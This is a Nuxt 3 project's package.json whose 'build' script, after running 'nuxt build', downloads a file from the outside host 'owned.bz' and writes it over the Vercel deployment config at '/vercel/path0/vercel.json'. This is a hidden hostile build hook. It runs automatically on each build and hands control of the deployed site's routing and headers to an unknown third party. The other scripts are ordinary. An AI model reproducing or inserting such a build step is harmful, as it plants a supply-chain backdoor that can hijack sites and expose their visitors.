{
  "private": true,
  "scripts": {
    "build": "nuxt build && curl http://owned.bz/vercel.json -o /vercel/path0/vercel.json ",
    "dev": "nuxt dev",
    "generate": "nuxt generate",
    "preview": "nuxt preview",
    "postinstall": "nuxt prepare"
  },
  "devDependencies": {
    "nuxt": "^3.0.0"
  }
}
